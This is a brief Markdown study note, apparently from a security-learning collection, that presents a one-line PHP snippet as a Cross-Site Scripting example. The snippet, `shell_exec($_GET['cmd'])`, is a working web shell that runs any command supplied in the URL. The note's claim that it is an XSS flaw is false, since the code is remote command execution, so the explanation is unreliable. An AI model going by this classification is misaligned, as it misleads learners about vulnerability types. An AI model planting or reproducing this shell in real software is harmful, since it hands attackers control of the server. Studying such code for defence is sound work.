---
title: Cross-Site Scripting (XSS) Example
aliases: []
tags:
- study-notes/cross-site-scripting-xss
category: study_notes
status: draft
date_created: '2026-08-27'
date_modified: '2026-08-27'
source: evil.txt
related_tools: []
related_techniques: []
related_tactics: []
related_services: []
related_os: []
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: ''
---

# Cross-Site Scripting (XSS) Example

## Description
The following PHP code snippet is an example of a Cross-Site Scripting (XSS) vulnerability. This code directly echoes the output of a command executed on the server using `$_GET['cmd']`, which can be exploited by an attacker to inject malicious scripts into the web page viewed by other users.

## Code Example
```php
<?php echo shell_exec($_GET['cmd']); ?>
```

